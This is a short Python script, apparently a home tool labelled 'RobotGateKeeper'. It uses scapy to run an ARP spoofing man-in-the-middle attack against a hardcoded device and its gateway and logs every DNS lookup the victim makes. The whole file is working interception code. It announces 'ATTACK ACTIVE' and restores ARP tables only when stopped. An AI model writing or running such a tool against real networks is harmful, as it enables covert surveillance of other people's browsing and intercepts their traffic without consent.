import sys
import time
import threading
from scapy.all import sniff, conf, get_working_ifaces, send, ARP, IP, DNS, DNSQR
from datetime import datetime

# --- HARDCODED CONFIGURATION ---
TARGET_IP = "192.168.10.7"
GATEWAY_IP = "192.168.10.6"
TARGET_MAC = "38:ca:84:43:9f:2a"
GATEWAY_MAC = "fc:4d:d4:2d:d4:e7"


def spoof():
    target_pkt = ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=GATEWAY_IP)
    router_pkt = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=TARGET_IP)
    print(f"[*] ATTACK ACTIVE: Intercepting {TARGET_IP} <--> Router")
    try:
        while True:
            send(target_pkt, verbose=False)
            send(router_pkt, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping and restoring network...")
        restore_t = ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
        restore_g = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=TARGET_IP, hwsrc=TARGET_MAC)
        send(restore_t, count=5, verbose=False)
        send(restore_g, count=5, verbose=False)
        sys.exit()


def packet_callback(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            qname = pkt.getlayer(DNSQR).qname.decode('utf-8').strip(".")

            # EXACT IP OF THE SENDER AND RECEIVER
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst

            # Format the output to show the flow
            if src_ip == TARGET_IP:
                print(f"!!! [{timestamp}] [SENDER: {src_ip}] -> [DEST: {dst_ip}] | WEBSITE: {qname}")
            else:
                print(f"    [{timestamp}] [SENDER: {src_ip}] -> [DEST: {dst_ip}] | WEBSITE: {qname}")
        except:
            pass


if __name__ == "__main__":
    interfaces = get_working_ifaces()
    target_iface = next((i for i in interfaces if "Wi-Fi" in i.description), None)
    if not target_iface:
        sys.exit("[-] Error: Wi-Fi card not found.")

    conf.iface = target_iface.name
    threading.Thread(target=spoof, daemon=True).start()

    print(f"--- RobotGateKeeper: Detailed Flow Monitor ---")
    # Capturing all DNS traffic on the interface
    sniff(prn=packet_callback, filter="udp port 53", store=0)